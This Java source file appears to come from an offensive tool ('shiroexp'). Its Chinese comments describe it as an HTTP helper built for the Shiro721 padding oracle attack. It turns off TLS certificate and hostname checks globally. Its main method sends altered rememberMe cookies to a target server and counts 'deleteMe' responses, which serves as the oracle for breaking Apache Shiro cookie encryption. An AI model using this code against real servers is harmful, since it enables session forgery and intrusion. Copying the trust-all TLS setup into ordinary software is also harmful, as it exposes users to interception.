package com.y5neko.shiroexp.util;

import javax.net.ssl.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * HTTP 请求工具类（简化版）
 * 专门用于 Shiro721 Padding Oracle 攻击
 */
public class HttpRequest {

    // rememberMe Cookie 名称，默认为 rememberMe
    private static final String REMEMBER_ME_COOKIE_NAME = "rememberMe";

    static {
        try {
            // 设置 HTTPS 信任所有证书
            SSLContext sslcontext = SSLContext.getInstance("SSL");
            sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
                @Override
                public void checkClientTrusted(X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(X509Certificate[] chain, String authType) {
                }

                @Override
                public X509Certificate[] getAcceptedIssuers() {
                    return new X509Certificate[0];
                }
            }}, null);
            HostnameVerifier ignoreHostnameVerifier = new HostnameVerifier() {
                @Override
                public boolean verify(String s, SSLSession sslsession) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
        } catch (NoSuchAlgorithmException | KeyManagementException e) {
            e.printStackTrace();
        }
    }

    /**
     * 统计 deleteMe Cookie 的数量
     * 这是 Padding Oracle 攻击的核心方法，用于判断服务器是否接受修改后的 Cookie
     *
     * @param httpRequestInfo HTTP 请求信息
     * @param cookieValue Cookie 值（Base64 编码）
     * @return deleteMe Cookie 的数量
     */
    public static int getDeleteMeCount(HttpRequestInfo httpRequestInfo, String cookieValue) {
        int count = 0;
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();
            connection.setRequestMethod(httpRequestInfo.getRequestMethod());

            // 设置请求头
            if (httpRequestInfo.getHeaders().size() == 0) {
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
                connection.setRequestProperty("Cookie", REMEMBER_ME_COOKIE_NAME + "=" + cookieValue);
                connection.setRequestProperty("Connection", "close");
            } else {
                Map<String, String> cloneHeaders = new HashMap<>();
                cloneHeaders.putAll(httpRequestInfo.getHeaders());

                String cookie = cloneHeaders.get("Cookie");
                if (cookie == null) {
                    cloneHeaders.put("Cookie", REMEMBER_ME_COOKIE_NAME + "=" + cookieValue);
                } else if (!cookie.contains(REMEMBER_ME_COOKIE_NAME + "=")) {
                    cookie = cookie + "; " + REMEMBER_ME_COOKIE_NAME + "=" + cookieValue;
                    cloneHeaders.put("Cookie", cookie);
                } else {
                    int start = cookie.indexOf(REMEMBER_ME_COOKIE_NAME) + REMEMBER_ME_COOKIE_NAME.length() + 1;
                    int end = cookie.indexOf(";", start);
                    end = end == -1 ? cookie.length() : end;
                    cookie = cookie.substring(0, start) + cookieValue + cookie.substring(end);
                    cloneHeaders.put("Cookie", cookie);
                }

                // 添加头部
                for (Map.Entry<String, String> entry : cloneHeaders.entrySet()) {
                    connection.setRequestProperty(entry.getKey(), entry.getValue());
                }
            }

            // 设置 POST 请求体
            String requestBody = httpRequestInfo.getRequestBody();
            if (requestBody != null && !requestBody.trim().equals("")) {
                connection.setDoOutput(true);
                connection.setDoInput(true);

                PrintWriter printWriter = new PrintWriter(connection.getOutputStream());
                printWriter.write(requestBody);
                printWriter.flush();
            }

            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();

            // 统计 deleteMe Cookie
            Map<String, List<String>> map = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : map.entrySet()) {
                if (entry.getKey() == null) {
                    continue;
                }

                if (entry.getKey().equalsIgnoreCase("set-cookie")) {
                    for (String str : entry.getValue()) {
                        if (str.contains(REMEMBER_ME_COOKIE_NAME + "=deleteMe")) {
                            count++;
                        }
                    }
                    break;
                }
            }
        } catch (Exception e) {
            // 静默处理异常
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }

        return count;
    }
}
